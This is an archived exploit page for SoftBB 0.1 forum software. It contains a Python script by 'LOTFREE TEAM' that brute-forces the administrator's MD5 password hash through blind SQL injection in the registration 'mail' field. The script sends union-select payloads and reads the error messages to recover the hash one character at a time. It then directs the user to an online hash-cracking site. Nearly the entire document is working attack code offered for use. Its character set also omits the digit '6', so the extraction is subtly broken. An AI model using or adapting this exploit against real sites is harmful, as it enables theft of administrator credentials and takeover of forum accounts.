<html><head><title>SoftBB 0.1 (mail) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/env python
# LOTFREE TEAM 03/2006
# http://lotfree.next-touch.com/
# http://membres.lycos.fr/lotfree/sploits/LOTF-SoftBB.py
#
# Vulnerability info
# Product : SoftBB
# Version : 0.1
#
# The field 'mail' in reg.php is used directly in a SQL query :
# $sql = 'SELECT pseudo,mail FROM '.$prefixtable.'membres WHERE pseudo = &quot;'.add_gpc($pseudoreg).'&quot; OR mail = &quot;'.$mail.'&quot;';
# We can deduce deduce the result of some sql querys according to the error messages returned
# The exploit test the characters of the md5 hash one by one using a special query
import httplib, urllib

# Change the following values...
admin=&quot;admin&quot;
server=&quot;localhost&quot;
path=&quot;/forum&quot;
#
hash=&quot;&quot;
chars=('a','b','c','d','e','f','1','2','3','4','5','7','8','9','0')

print &quot;LOTFREE TEAM SoftBB BruteForcing tool&quot;
print &quot;-------------------------------------&quot;
for i in range(1,33):
  print &quot;Brute forcing hash[&quot;+str(i)+&quot;]&quot;
  for a in chars:
    params=urllib.urlencode({'pseudo':admin,
    'mdp':'1',
    'mdpc':'1',
    'mail':'&quot; union select pseudo,1 from softbb_membres where pseudo=&quot;'+admin+'&quot; and substr(mdp,'+str(i)+',1)=&quot;'+a+'&quot; limit 1,1#',
    'condok':'true'})
    headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/plain&quot;}
    conn = httplib.HTTPConnection(server)
    conn.request(&quot;POST&quot;, path+&quot;/index.php?page=reg&quot;, params, headers)
    response = conn.getresponse()
    data = response.read()
    conn.close()
    if data.find(&quot;Ce pseudonyme est d&quot;)&gt;0:
      hash=hash+a
      continue

print
if len(hash)==32:
  print &quot;Found hash =&quot;,hash,&quot;for account&quot;,admin
  print &quot;You can use http://md5.rednoize.com/ to crack the md5 hash&quot;
else:
  print &quot;Exploit failed... verify the path to the forum or try changing the limit 1,1 in the sql request...&quot; 

# milw0rm.com [2006-03-19]</pre></html>